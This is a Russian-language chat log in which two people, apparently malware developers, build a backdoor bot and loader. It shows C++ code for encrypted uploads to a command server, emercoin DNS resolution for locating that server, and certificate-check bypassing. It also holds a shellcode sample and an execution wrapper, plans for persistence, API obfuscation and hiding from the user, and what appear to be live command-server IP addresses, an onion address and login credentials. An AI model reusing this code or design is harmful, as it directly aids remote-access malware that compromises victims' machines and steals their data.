2020-06-22T08:48:55 mushroom -> frog
Посмотрел код твой. Уточнение у тебя команда 1 считается не блокирующей?

2020-06-22T08:49:37 mushroom -> frog
//  Если в данный момент времени работает не блокирующая команда, а приходит любая команда, кроме Reset, её нужно игнорировать
	if (((tcode >= 10 && tcode <= 13) || tcode == 1) && new_command_code != 14)
		return;

2020-06-22T08:53:03 frog -> mushroom
Привет!
Сначала сделал, чтобы команду 1 можно было прервать, а только потом узнал, что она должна быть блокирующей. Оставил её как неблокирующую (на всякий случай, хуже наверное же не будет).

2020-06-22T08:57:05 mushroom -> frog
По идее не будет. Ещё уточнение, если какая либо ошибка происходит в процессе выполнения команды любой, что на сервер отправляешь?

2020-06-22T09:00:24 frog -> mushroom
Текст сообщения об ошибке.
Например:
send_result(string("could not download file from ") + uri);

2020-06-22T09:00:57 mushroom -> frog
Ещё код отправляй GetLastError который.

2020-06-22T09:01:05 mushroom -> frog
Или только код.

2020-06-22T09:01:27 mushroom -> frog
Чтобы точно можно было определить в чём ошибка.

2020-06-22T09:03:17 mushroom -> frog
Если ошибка при передаче произошла, ещё делаешь попытки отправить тоже самое?

2020-06-22T09:04:18 frog -> mushroom
Хорошо

2020-06-22T09:04:50 frog -> mushroom
Нет, пока это не делал.

2020-06-22T09:06:10 mushroom -> frog
Будешь делать когда команды все доделаешь?

2020-06-22T09:06:18 mushroom -> frog
Какие остались?

2020-06-22T09:08:53 frog -> mushroom
Остался Terminate Process. Остальные сделал, протестировал на каких-то своих данных, вроде всё работает.

2020-06-22T09:09:22 mushroom -> frog
Команда загрузки файла на сервер работает?

2020-06-22T09:10:58 frog -> mushroom
Но получается обработку ошибок нужно сделать везде (добавить GetLastError, отправку PID процесса и т.д.). Команду загрузки файла протестировал, с сервера потом загружается такой же файл, как и был отправлен (следовательно, всё работает)

2020-06-22T09:15:13 mushroom -> frog
Для загрузки файла на сервер советую сделать таймаут для запроса побольше, а то бывает что связь с серверром тормозная.
DWORD timeoutSize = sizeof(timeout);
wininet.internetSetOption(req, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, timeoutSize);

2020-06-22T09:15:39 mushroom -> frog
8 - 10 минут таймаут сделай.

2020-06-22T09:37:44 mushroom -> frog
Ещё уточнение. После того как отрабатывают процессы на запуск файла с диска, ты эти файлы удаляешь? Имена этих файлов генерируешь случайным образом?

2020-06-22T09:39:58 frog -> mushroom
Да, имена генерирую случайным образом (из 10 символов), сохраняю в папке temp. Потом удаляю, после того, как процесс завершится.

2020-06-22T09:40:26 mushroom -> frog
OK. Таймаут как я писал выше повысь для запроса.

2020-06-22T09:40:40 mushroom -> frog
Загрузки файла на сервер.

2020-06-22T09:43:48 frog -> mushroom
Хорошо. 

2020-06-23T09:02:52 mushroom -> frog
Я вчера забыл спросить. У тебя шелл код выполняется в блоке SEH?

2020-06-23T09:03:24 mushroom -> frog
А то накроется вся программа при малейшей ошибке в шелл коде.

2020-06-23T09:05:29 mushroom -> frog
Типа так:
__try
    {
        (*(VOID(*)())codeAddr)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
    }

2020-06-23T09:05:57 mushroom -> frog
__try\__except обязательно оберни

2020-06-23T09:06:11 frog -> mushroom
Привет
Нет. Тоже об этом думал. Попытался обернуть это в секцию try, catch, но не помогло. 
Хорошо, сделаю так. Спасибо.

2020-06-23T09:06:41 mushroom -> frog
try\catch не ловит такие ошибки, а SEH ловит.

2020-06-23T09:07:14 frog -> mushroom
А в стандартный канал нужно считывать в этом случае?

2020-06-23T09:07:32 mushroom -> frog
Нет. Ты его никак не считаешь.

2020-06-23T09:07:57 mushroom -> frog
Это же просто выполнение инструкций машинных.

2020-06-23T09:08:13 mushroom -> frog
У тебя есть пример шелл кода?

2020-06-23T09:09:30 frog -> mushroom
Простой какой-то сам себе сделал, который соответствует командам 
MOV EAX, 128
RET

2020-06-23T09:10:11 mushroom -> frog
Вот:
33 C9 64 8B 49 30 8B 49 0C 8B 49 1C 8B 59 08 8B 41 20 8B 09 80 78 0C 33 75 F2 8B EB 03 6D 3C 8B 6D 78 03 EB 8B 45 20 03 C3 33 D2 8B 34 90 03 F3 42 81 3E 47 65 74 50 75 F2 81 7E 04 72 6F 63 41 75 E9 8B 75 24 03 F3 66 8B 14 56 8B 75 1C 03 F3 8B 74 96 FC 03 F3 33 FF 57 68 61 72 79 41 68 4C 69 62 72 68 4C 6F 61 64 54 53 FF D6 33 C9 57 66 B9 33 32 51 68 75 73 65 72 54 FF D0 57 68 6F 78 41 01 FE 4C 24 03 68 61 67 65 42 68 4D 65 73 73 54 50 FF D6 57 68 72 6C 64 21 68 6F 20 57 6F 68 48 65 6C 6C 8B CC 57 57 51 57 FF D0

2020-06-23T09:11:41 mushroom -> frog
Окно Hello World показывает, это 32 битный код. Так как там не востанавливается стек после вызова как раз и произойдёт ошибка, которую __try\__catch должно поймать. Но окно Hello World ты увидишь, как закроешь его и произойдёт ошибка.

2020-06-23T09:14:12 mushroom -> frog
__try\__except я имел ввиду.

2020-06-25T13:22:42 mushroom -> frog
Привет. Что на данный момент осталось из команд?

2020-06-25T19:39:23 frog -> mushroom
Осталась команда Terminate Process. Сделал обработку исключений для команды Shell Code. Собираюсь ещё в ближайшее время сделать отправку кода последней ошибки LastErrorCode.

2020-06-26T07:08:30 frog -> mushroom
Осталась команда Terminate Process. Сделал обработку исключений для команды Shell Code. Собираюсь ещё в ближайшее время сделать отправку кода последней ошибки LastErrorCode.

2020-06-26T13:48:25 mushroom -> frog
Сообщи когда доделаешь бот, я хочу скомпилировать у себя и посмотреть. Ещё сделай утилиту, которая выводит в stdout такой же id бота, как генерирует его программа твоя, это нужно для автотестов.

2020-06-29T08:16:53 frog -> mushroom
Добрый день.
Доделал команды. Утилиту тоже сделал. Загрузил всё на gitlab.

2020-06-29T09:18:30 mushroom -> frog
OK. Посмотрю. Доделывай загрузчик.

2020-06-29T09:18:47 mushroom -> frog
Закрепление в системе.

2020-06-29T09:24:08 frog -> mushroom
Пример какой-нибудь где можно посмотреть?

2020-06-29T09:24:41 mushroom -> frog
Сейчас пришлю.

2020-06-29T09:27:16 mushroom -> frog
https://send.firefox.com/download/002a7f773739c622/#5liyPOtHqNs6z-JvZbNjCA

2020-06-29T09:27:24 mushroom -> frog
Пароль: }]AuYgk<"T+GypuSD

2020-06-29T09:29:08 mushroom -> frog
И в ТЗ есть ссылка на статью в которой описываются возможные способы https://habr.com/ru/post/425177/

2020-06-29T09:30:01 frog -> mushroom
Спасибо

2020-06-29T14:54:55 mushroom -> frog
Бинарники не коммить в репозиторий. bd7_id.exe убери. Просто бинарники на прямую присылай, тому кто просит.

2020-06-29T14:55:21 mushroom -> frog
В зашифрованном архиве, с шифрованными заголовками файлов.

2020-06-29T15:12:37 frog -> mushroom
Готово.
https://send.firefox.com/download/f84edc7610dfa4b1/#C8FTKpKAgfnUl8gMwPN21g
jkf34~!@##$78tkfolf;=2-34i
Удалил бинарник

2020-06-29T15:19:01 mushroom -> frog
OK.

2020-06-29T15:20:53 mushroom -> frog
А что их два? Id зависит от битности программы?

2020-06-29T15:26:17 frog -> mushroom
Нет, id одинаковые выдают. Подумал, может нужны оба (для тестирования), поэтому на всякий случай сделал

2020-06-29T15:26:43 mushroom -> frog
Понял.

2020-06-29T15:35:37 mushroom -> frog
У тебя в ботах такой есть fd55ba0a664663c0f816699197d3778a ?

2020-06-29T15:36:10 mushroom -> frog
Я группу заменил у тебя в исходниках на свою и не вижу бота этого у себя.

2020-06-29T15:49:37 frog -> mushroom
Есть такой

2020-06-29T15:50:43 mushroom -> frog
У него группа frog?

2020-06-29T15:51:00 frog -> mushroom
Да

2020-06-29T15:51:43 mushroom -> frog
Понял. Значит поменяю id.

2020-06-30T08:03:03 mushroom -> frog
Привет. Читал в задании к загрузчику как надо подключаться к серверу?

2020-06-30T08:38:09 mushroom -> frog
Смотрю бэкдор твой.

2020-06-30T08:39:00 mushroom -> frog
Выполняется команда 0 300, получается 300 секунд ждёт в команде и ещё 300 секунд между командами.

2020-06-30T08:39:58 mushroom -> frog
Команда 0 <время> значит запросить команду через <время секунд>, не нужно ещё пять минут ждать.

2020-06-30T08:40:13 mushroom -> frog
Для команды 1 так же.

2020-06-30T08:40:42 mushroom -> frog
А вот для команд на запуск процессов, нужно каждые 5 минут запрашивать команду.

2020-06-30T08:42:25 mushroom -> frog
Выполнил команду на запуск скрипта:
Microsoft Windows [Version 10.0.19041.329]
(c) Љ®аЇ®а жЁп Њ ©Єа®б®дв (Microsoft Corporation), 2020. ‚бҐ Їа ў  § йЁйҐ­л.

C:\Users\ivana\Projects\others\bd7\bd7>dir
’®¬ ў гбва®©бвўҐ C Ё¬ҐҐв ¬ҐвЄг
BOOTCAMP
‘ҐаЁ©­л© ­®¬Ґа в®¬ : 0246-9FF7

‘®¤Ґа¦Ё¬®Ґ Ї ЇЄЁ C:\Users\ivana\Projects\others\bd7\bd7

2020-06-30T08:42:53 mushroom -> frog
Он выполнился, но ты наверное забыл вывод в UTF-8 закодировать.

2020-06-30T08:43:24 mushroom -> frog
Всё что на сервер посылаешь всё нужно в UTF-8 кодировать.

2020-06-30T08:47:18 frog -> mushroom
Привет. Хорошо. Пробовал кодировать в UTF-8, но что-то тогда не получилось, сервер не хотел принимать ответ. Попробую ещё раз, может где-то ошибся.
По поводу таймаутов: просто не понял этот момент в ТЗ.

2020-06-30T08:48:41 mushroom -> frog
Это только для команд 0 и 1 таймаут значит перезвонить на сервер через таймаут после выполнения команды.

2020-06-30T08:48:57 mushroom -> frog
0 300 -> перезвонить через 5 минут

2020-06-30T08:49:17 mushroom -> frog
1 300 -> перезвонить через 5 минут после выполнения команды.

2020-06-30T08:49:57 mushroom -> frog
Для всех остальных у кого есть таймаут (это запуск процесса), таймаут это время работы процесса максимальное.

2020-06-30T08:50:43 mushroom -> frog
У кого нет таймаута, после выполнения команды ждать 5 минут по умолчанию.

2020-06-30T08:52:00 mushroom -> frog
Ну и когда процесс работает, он же не блокирующая команда, через каждые 5 минут команду запрашивать, как по умолчанию.

2020-06-30T08:54:27 mushroom -> frog
Окно это для отладки выходит всё время с выводом?

2020-06-30T08:54:52 frog -> mushroom
Да, это для отладки

2020-06-30T08:57:40 frog -> mushroom
Когда выполнили команду запуска (неблокирующую команду), отослали результат, следующую команду запрашивать сразу или подождать в цикле когда  5 минут истечёт?

2020-06-30T09:00:29 mushroom -> frog
Получил команду, запустил процесс, спишь 5 минут, процесс работает, если он 1 минуту отработал, отправил результат на сервер, осталось спать 4 минуты получается, 4 минут прошло, запрос команды.

2020-06-30T09:01:37 mushroom -> frog
То есть спит программа между запросами 5 минут не зависимо от работающего процесса.

2020-06-30T09:02:00 frog -> mushroom
Понятно.

2020-06-30T09:02:23 mushroom -> frog
Единственное надо синхронизировать потоки.

2020-06-30T09:02:33 mushroom -> frog
Ну ты в курсе я думаю.

2020-06-30T09:03:16 frog -> mushroom
Конечно

2020-06-30T09:04:05 mushroom -> frog
Что то powershell скрипт "cd c:\\r\ndir\r\n" никакого вывода.

2020-06-30T09:04:29 mushroom -> frog
Это я запускал без файла.

2020-06-30T09:04:35 mushroom -> frog
Проверь.

2020-06-30T09:05:30 mushroom -> frog
А не, работает.

2020-06-30T09:06:13 mushroom -> frog
Я окно не закрыл отладочное. После него отправляется на сервер вывод.

2020-06-30T09:06:49 mushroom -> frog
Файлы, если запуск со скачкой на диск в temp сохраняются?

2020-06-30T09:07:00 frog -> mushroom
Так точно

2020-06-30T09:07:32 frog -> mushroom
Окно отладочное показывает, что отправляется на сервер.

2020-06-30T09:08:24 mushroom -> frog
Вывод сделай для отладки имена этих файлов, чтобы можно было проверить в temp, что они удаляются после того как отработали.

2020-06-30T09:12:11 mushroom -> frog
И вывод для отладки поподробней сделай, чтобы тестер тебе когда ошибки возникают лог отправлял, и ты ошибку быстро находил. Вывод адресов куда подключаешься точно нужно сделать.

2020-06-30T09:12:55 frog -> mushroom
И вывод для отладки поподробней сделай, чтобы тестер тебе когда ошибки возникают лог отправлял, и ты ошибку быстро находил. Вывод адресов куда подключаешься точно нужно сделать.

2020-06-30T09:14:02 mushroom -> frog
И вывод для отладки поподробней сделай, чтобы тестер тебе когда ошибки возникают лог отправлял, и ты ошибку быстро находил. Вывод адресов куда подключаешься точно нужно сделать.

2020-06-30T09:15:51 frog -> mushroom
http-адресов?
А отладочный вывод делать в Std Output?

2020-06-30T09:16:27 mushroom -> frog
http адресов, отладочный вывод, это который у тебя debug_printf

2020-06-30T09:17:07 mushroom -> frog
Чтобы вывод debug_printf отключить можно было полностью через макрос.

2020-06-30T09:17:27 mushroom -> frog
Буза тебе давал для вывода отладочного файлы?

2020-06-30T09:17:51 frog -> mushroom
Нет

2020-06-30T09:18:49 mushroom -> frog
debug_printf это ты сам написал значит?

2020-06-30T09:19:11 mushroom -> frog
Оставляй их я тебе пришлю сейчас.

2020-06-30T09:20:53 mushroom -> frog
https://send.firefox.com/download/f61414768ac8ffad/#0qIz2TZulK3-7rDckHyoIA

2020-06-30T09:20:58 mushroom -> frog
Пароль: 123

2020-06-30T09:21:54 mushroom -> frog
Связь?

2020-06-30T09:24:40 frog -> mushroom
Здесь

2020-06-30T09:24:46 mushroom -> frog
Получил?

2020-06-30T09:24:51 frog -> mushroom
Да

2020-06-30T09:25:05 mushroom -> frog
debug_printf("Text")

2020-06-30T09:25:21 mushroom -> frog
Макросом выключается полностью если надо.

2020-06-30T09:25:45 mushroom -> frog
В файле tdebug.h

2020-06-30T09:25:55 mushroom -> frog
Смотри

2020-06-30T09:26:16 mushroom -> frog
Там есть вывод в консоль, в файл, в debug output.

2020-06-30T09:27:10 mushroom -> frog
макрос RELEASE_NO_LOGS отключает весь вывод через debug_printf

2020-06-30T09:28:38 mushroom -> frog
макрос LOG_TO_FILE вывод в файл такой же как и в консоль, работает если макрос RELEASE_NO_LOGS не указан.

2020-06-30T09:29:06 mushroom -> frog
Разберешься, изменишь что нужно под себя.

2020-06-30T09:29:44 mushroom -> frog
В проекте сейчас Debug x86\x64, Release x86\x64.

2020-06-30T09:30:24 mushroom -> frog
Надо добавить ещё Release_nologs x86\x64 в решение, и там отключить весь отладочный вывод.

2020-06-30T09:30:55 mushroom -> frog
А в Release x86\x64 сделать вывод в консоль и в файл.

2020-06-30T09:31:26 mushroom -> frog
Принял?

2020-06-30T09:31:33 frog -> mushroom
Так точно

2020-06-30T09:32:49 mushroom -> frog
Когда сделаешь поправки все пиши. Тогда скажу как обфусцировать вызовы WinApi.

2020-06-30T09:34:06 frog -> mushroom
Через GetApi.h не надо было обфусцировать?

2020-06-30T09:34:33 mushroom -> frog
Можно и так. Только там нету всех функций что у тебя в коде.

2020-06-30T09:35:38 mushroom -> frog
Я тебе ещё один вариант покажу, а там решишь как тебе удобней.

2020-06-30T10:06:37 mushroom -> frog
5 мб файл не смог загрузить на сервер твоим бэкдор.

2020-06-30T10:06:54 mushroom -> frog
Проверь.

2020-06-30T10:08:33 frog -> mushroom
5 мб файл не смог загрузить на сервер твоим бэкдор.

2020-06-30T10:08:33 frog -> mushroom
Проверь.

2020-06-30T10:14:56 mushroom -> frog
Связь есть?

2020-06-30T10:16:27 mushroom -> frog
Команда информация о системе дала ip неверный 192.168.56.1 192.168.1.42, а надо внешний ip.

2020-06-30T10:16:28 mushroom -> frog
5 мб файл не смог загрузить на сервер твоим бэкдор.

2020-07-02T07:53:14 frog -> mushroom
Привет!
Функция CHTTP::postBinary выполняет отправку файла на сервер. Не пойму, что делаю в ней не так. Таймаут увеличил до 10 минут.

2020-07-02T08:06:50 mushroom -> frog
Привет. Сейчас посмотрю.

2020-07-02T08:12:35 mushroom -> frog
Перед отправкой шифруешь файл?

2020-07-02T08:12:48 mushroom -> frog
В postBinary нету шифрования.

2020-07-02T08:13:26 frog -> mushroom
В CHTTP::post шифрование

2020-07-02T08:14:36 mushroom -> frog
Content-Length: %d d в заголовке можно не писать, это wininet сам вставит.

2020-07-02T08:16:35 mushroom -> frog
CHTTP::post нету шифрования тоже.

2020-07-02T08:17:28 frog -> mushroom
bool CHTTP::post(char* id, const PBYTE data, DWORD data_size)
{
    // Отправим результат работы на сервер
    PBYTE xor_data = (PBYTE)pHeapAlloc(GetProcessHeap(), 0, data_size);

    xor_crypt(data, data_size, id, xor_data);

2020-07-02T08:17:51 frog -> mushroom
xor_crypt - шифрование.

2020-07-02T08:18:27 mushroom -> frog
Вот что у меня:
bool CHTTP::post(const char* objectName, const PBYTE body, DWORD bodyLength, PBYTE* data, DWORD* dataSize)
{
    if (data != nullptr) *data = nullptr;
    if (dataSize != nullptr) *dataSize = 0;

    if (hHttpSession == NULL)
        return false;
    HINTERNET hHttpRequest = HttpOpenRequestA(
        hHttpSession, "POST", objectName, "1.1",
        nullptr, nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_COOKIES, 0);

    if (hHttpRequest == NULL)
        return false;

    char szHeaders[] = "Content-Type: application/x-www-form-urlencoded\r\nCookie: group=" GROUP;
    if (!HttpSendRequestA(hHttpRequest, szHeaders, strlen(szHeaders), body, bodyLength))
    {
        InternetCloseHandle(hHttpRequest);
        return false;
    }

    // Проверяем код статуса
    if (!okStatus(hHttpRequest))
    {
        InternetCloseHandle(hHttpRequest);
        return false;
    }

    read(hHttpRequest, data, dataSize);

    InternetCloseHandle(hHttpRequest);
    return true;
}

2020-07-02T08:19:22 mushroom -> frog
Нашёл перегруженный метод. Там есть шифрование.

2020-07-02T08:27:27 mushroom -> frog
Может Content-Length: %d в заголовке. Попробуй без него, его wininet высчитывает сам.

2020-07-02T08:28:21 mushroom -> frog
Я ещё у себя проверю, может сервер тупит, попозже.

2020-07-02T09:39:13 mushroom -> frog
Я проверил у себя. У меня тоже файл не отправляется. Это на сервере косяк, такое уже было. Отложи пока эту команду.

2020-07-02T09:43:24 frog -> mushroom
Я проверил у себя. У меня тоже файл не отправляется. Это на сервере косяк, такое уже было. Отложи пока эту команду.

2020-07-02T09:44:23 mushroom -> frog
Я проверил у себя. У меня тоже файл не отправляется. Это на сервере косяк, такое уже было. Отложи пока эту команду.

2020-07-02T09:44:49 frog -> mushroom
Хорошо. Но картинку размером 1,75 мб всё-таки удалось отправить с n-ой попытки

2020-07-02T09:45:24 mushroom -> frog
Да. Маленькие файлы сервер принимает.

2020-07-02T09:45:39 mushroom -> frog
5 мб не принимает.

2020-07-02T09:46:06 mushroom -> frog
А должен до 10 мб включительно принимать.

2020-07-02T09:46:47 mushroom -> frog
Команда информация о системе дала ip неверный 192.168.56.1 192.168.1.42, а надо внешний ip. Это было в прошлый раз когда я смотрел. Изменения есть?

2020-07-02T09:48:13 frog -> mushroom
Сделал запрос внешнего ip-адреса с "https://myexternalip.com/raw".

2020-07-02T09:48:30 mushroom -> frog
Типа того.

2020-07-02T09:52:52 mushroom -> frog
Команда suicide отправляет что нибудь на сервер?

2020-07-02T09:53:11 mushroom -> frog
Надо отправлять OK и выключаться.

2020-07-02T09:53:55 mushroom -> frog
В прошлый раз не отправляла ничего, из-за этого в админке эта команда pending.

2020-07-02T09:58:51 mushroom -> frog
Сейчас выполнил команду 1 пришли такие ip 192.168.56.1, 192.168.1.42.

2020-07-02T09:59:03 mushroom -> frog
Опять не внешние.

2020-07-02T09:59:45 frog -> mushroom
Хорошо, сделаю.
Если нужно, можно в функции process в цикле сделать
command = "14";
Ещё сделал кодирование из OEM в ANSI содержимого стандартных потоков. Теперь на сервере всё читается.
Сейчас проверю, может на gitlab ещё не загрузил.

2020-07-02T10:00:22 mushroom -> frog
И система как Win 8 определяется, а у меня Win 10.

2020-07-02T10:00:49 mushroom -> frog
В поле где антивирусы
Standart Output
Standart Error
ОШИБКА.
Описание: Неправильное пространство имен

2020-07-02T10:02:26 mushroom -> frog
Скажешь когда загрузишь. Так получается всё сделано?

2020-07-02T10:03:00 frog -> mushroom
Ещё нужно debug_printf всюду вставить.

2020-07-02T10:04:23 mushroom -> frog
Тогда скажу чтобы тебе сделали учётную запись в рабочей админке, чтобы там тестировать.

2020-07-02T10:07:34 frog -> mushroom
Антивирусник узнаю так:
run("wmic /namespace:\\root\SecurityCenter path AntivirusProduct get displayName, versionNumber /format:list");
Сделаю команду отключения, отладку (debug_printf) и потом загружу на gitlab

2020-07-02T10:24:08 mushroom -> frog
И ещё у тебя сейчас адрес сервера просто берётся, а в ТЗ его надо получать. Сначала проходить по списку простых адресов, потом по списку адресов emercoin, потом по списку сгенерированных адресов. Это у загрузчика и у бота одинаково происходит. Когда учётную запись сделают тебе на рабочей админке, я дам тебе эти списки.

2020-07-02T10:24:50 mushroom -> frog
Ты же не сделал получение адреса из сети emercoin?

2020-07-02T10:25:46 frog -> mushroom
Нет. Ещё не сделал.

2020-07-02T10:26:10 mushroom -> frog
Тебе Буза пример давал?

2020-07-02T10:27:42 frog -> mushroom
Есть модуль resolve_emercoin.h среди тех файлов, что давал Буза

2020-07-02T10:29:01 mushroom -> frog
Значит есть. Есть ещё один способ, он проще, я сейчас пришлю, он будет основным, а resolve_emercoin запасным.

2020-07-02T10:30:44 mushroom -> frog
BOOL emercoinResolveDns(PCSTR emercoinAddress, PSTR resolvedAddress)
{
	PBYTE resp = NULL;
	SIZE_T respSize = 0;
	if (downloadBuffer(_TSTR(TEXT("https://api.opennicproject.org/geoip/?bare&ipv=4")), &resp,
		&respSize))
	{
		IP4_ARRAY dnsServersArray = { 0 };
		dnsServersArray.AddrCount = 1;

		PDNS_RECORD dnsRecord = NULL;
		DNS_STATUS status;

		PSTR addrs = (PSTR)resp;
		PSTR context = NULL;
		while (*addrs != '\0')
		{
			IN_ADDR addr = { 0 };
			PSTR token = strtok_s(addrs, "\n", &context);
			addrs = context;

			if (pinet_pton(AF_INET, token, &addr))
			{
				CopyMemory(dnsServersArray.AddrArray, &addr, sizeof(IN_ADDR));
				status = dnsapi.dnsQuery_A(emercoinAddress, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE,
					&dnsServersArray, &dnsRecord, NULL);
				if (0 == status)
				{
					CHAR addrStr[17];
					pinet_ntop(AF_INET, (PVOID)&dnsRecord->Data.A.IpAddress, addrStr,
						sizeof(addrStr));
					lstrcpyA(resolvedAddress, addrStr);

					dnsapi.dnsFree((PVOID)dnsRecord, DnsFreeRecordList);
					HeapFree(GetProcessHeap(), 0, resp);
					return TRUE;
				}

				dnsapi.dnsFree((PVOID)dnsRecord, DnsFreeRecordList);
			}
		}

		HeapFree(GetProcessHeap(), 0, resp);
	}

	return FALSE;
}

2020-07-02T10:31:51 mushroom -> frog
downloadBuffer(_TSTR(TEXT("https://api.opennicproject.org/geoip/?bare&ipv=4")) это просто GET запрос, получает список адресов.

2020-07-02T10:33:22 mushroom -> frog
В общем там адрес получается через dns запрос.

2020-07-02T10:38:17 mushroom -> frog
Вот для тренировки адрес thegame.bazar, должен получиться 34.222.222.126.

2020-07-02T10:39:59 mushroom -> frog
Каждый байт адреса после выполнения функции emercoinResolveDns ещё нужно расшифровать xor 254. И тогда уже получится 34.222.222.126.

2020-07-02T10:40:11 mushroom -> frog
Это левый адрес, на него ничего не шли.

2020-07-02T10:40:22 mushroom -> frog
Будут вопросы пиши.

2020-07-02T10:41:14 mushroom -> frog
Байт адреса имеется ввиду <байт>.<байт>.<байт>.<байт>

2020-07-03T10:45:04 mushroom -> frog
Привет.

2020-07-03T10:45:13 mushroom -> frog
Логин: b16

2020-07-03T10:45:27 mushroom -> frog
Пароль: ZYI%bLmcEAbV1sqQ

2020-07-03T10:45:48 mushroom -> frog
Это боевой сервер.

2020-07-03T10:46:13 mushroom -> frog
лоадеры
85.204.116.243
86.104.194.108
89.32.41.184
192.99.255.32
66.70.218.37
107.173.114.117

2020-07-03T10:46:24 mushroom -> frog
бот
185.180.198.99
86.104.194.109
45.148.120.173
185.99.2.221
5.1.81.68
86.104.194.110

2020-07-03T10:46:43 mushroom -> frog
Списки адресов.

2020-07-03T10:47:13 mushroom -> frog
Сделай подключение к серверу как в ТЗ для лоадера описано.

2020-07-03T10:49:09 mushroom -> frog
3 списка, первый список это чистые адреса, я их написал выше, второй список это адреса emercoin, сам можешь их придумать типа bestgame.bazaar, третий список генерируется автоматически на основе даты (описано в ТЗ для лоадера).

2020-07-03T10:49:54 mushroom -> frog
Это подключение происходит одинаково для бота и лоадера.

2020-07-03T10:52:56 mushroom -> frog
И сделай как удобно тебе, чтобы не путаться когда подключаешься к тестовому серверу, а когда к боевому. У меня например если макрос _DEBUG установлен подключение к тестовому, если нет к боевому. Release_nologs должны быть программа оконная, а не консоль (/SUBSYSTEM:WINDOWS), у тебя как сейчас?

2020-07-03T10:56:09 frog -> mushroom
Привет!
Release_nologs пока консольная.

2020-07-03T10:56:22 mushroom -> frog
Твоя группа на боевом сервере seven, не путай её с группой, которая у тебя на тестовом сервере. Для боевого seven, для тестового frog.

2020-07-03T10:56:57 mushroom -> frog
Поменяй Release_nologs на оконную программу, чтобы пользователь ничего не видел вообще.

2020-07-03T10:57:37 frog -> mushroom
Хорошо. Какой http-адрес боевого сервера?

2020-07-03T10:57:57 mushroom -> frog
https://scrytnuuszglaugg.onion

2020-07-06T11:18:46 frog -> mushroom
Привет.
Можно ли узнать дату и SID на сервере, не запрашивая саму команду (/%id%/2)? Есть ли отдельная команда для этого?
Дату подписывать локальную?
Поиск сервера выполняется один раз при запуске или там другой алгоритм?

2020-07-06T11:20:41 mushroom -> frog
Привет. Поиск сервера осуществляется при запуске, а если произошла какая нибудь ошибка связи, опять поиск по спискам.

2020-07-06T11:22:21 mushroom -> frog
Для получения SID не запрашивая команду делай запрос GET /<id>/4

2020-07-06T11:23:14 mushroom -> frog
Дата подписана та которую сервер присылает в заголовке.

2020-07-06T11:25:44 mushroom -> frog
Сервер пришлёт дату типа 2020-07-06 09:00:10 проверять подпись нужно только даты, время отбрасывать.

2020-07-06T11:26:34 mushroom -> frog
В случае если не удалось найти валидный командный сервер за 3 часа, следует либо завершиться, либо удалить себя из системы (определяется настройками сборки).

2020-07-06T11:27:06 mushroom -> frog
Алгоритм подключения полный смотри в ТЗ для загрузчика, он одинаковый для загрузчика и для бота.

2020-07-06T11:28:18 mushroom -> frog
Если ошибка при передаче данных произойдёт, ещё несколько попыток послать запрос, не удачно, переподключение.

2020-07-06T11:28:57 mushroom -> frog
Не получилось переподключиться за 3 часа, выход.

2020-07-06T11:34:30 frog -> mushroom
Использовать порт 80?

2020-07-06T11:35:53 mushroom -> frog
https используй всегда на боевом сервере, на тестовом какой хочешь.

2020-07-06T11:39:32 mushroom -> frog
Для https запросов, после функции HttpOpenRequest, надо установить флаги, чтобы игнорировать ошибки сертификатов, так как на сервере они самописные.

2020-07-06T11:39:44 mushroom -> frog
DWORD flags = 0;
    DWORD flagsSize = sizeof(flags);
    wininet.internetQueryOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flagsSize);
    if (isSecure)
    {
        flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
        flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
        flags |= SECURITY_FLAG_IGNORE_REVOCATION;
    }
    else
        flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP;
    wininet.internetSetOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, flagsSize);

2020-07-06T11:39:49 mushroom -> frog
типа так

2020-07-06T11:42:13 frog -> mushroom
isSecure равен значению "истина", если порт 443?

2020-07-06T11:46:01 mushroom -> frog
Да если https соединение, может же быть теоретически https соединение не для порта 443. По умолчанию 443.

2020-07-06T11:46:55 mushroom -> frog
ПРи открытии запроса тоже флаг не забудь передать если https соединение
HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
        NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);

2020-07-06T11:46:58 mushroom -> frog
типа так

2020-07-06T11:47:49 frog -> mushroom
Хорошо. Спасибо!

2020-07-06T11:47:54 mushroom -> frog
HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
       NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0); 
DWORD flagsSize = sizeof(flags);
   wininet.internetQueryOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flagsSize);
   if (isSecure)
   {
       flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
       flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
       flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
       flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
       flags |= SECURITY_FLAG_IGNORE_REVOCATION;
   }
   else
       flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP;
   wininet.internetSetOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, flagsSize);

2020-07-06T11:48:06 mushroom -> frog
Вот так, а потом уже запрос посылай.

2020-07-06T13:03:28 frog -> mushroom
Если дата на сервере не совпадает с локальной, то пропускать сервер?

2020-07-06T13:04:28 mushroom -> frog
Если подпись не сходится, или дата (без времени) не совпадает с локальной, ищем другой сервер. Так в ТЗ написано.

2020-07-06T13:38:19 frog -> mushroom
Как проверить, занят ли адрес emercoin, который сам придумал?

2020-07-06T13:39:12 mushroom -> frog
Который сам придумал, попробуй его получить. Через dns запрос как я писал или через resolve_emercoin.

2020-07-10T09:23:42 frog -> mushroom
Привет! Есть несколько вопросов.
